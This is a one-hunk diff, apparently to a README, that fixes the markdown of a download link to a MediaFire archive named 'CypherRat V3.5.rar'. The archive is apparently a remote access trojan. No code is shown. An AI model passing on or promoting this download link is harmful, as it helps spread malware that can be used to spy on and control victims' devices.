@@ -137,7 +137,7 @@ Images :
 
 **UPDATE 6/10/2022**  NEW
 
-[DOWNLOAD]([https://www.mediafire.com/file/ci74w5dhinrsd2t/CypherRat+V3.5.rar/file])
+[DOWNLOAD](https://www.mediafire.com/file/ci74w5dhinrsd2t/CypherRat+V3.5.rar/file)
 
 --------------
 
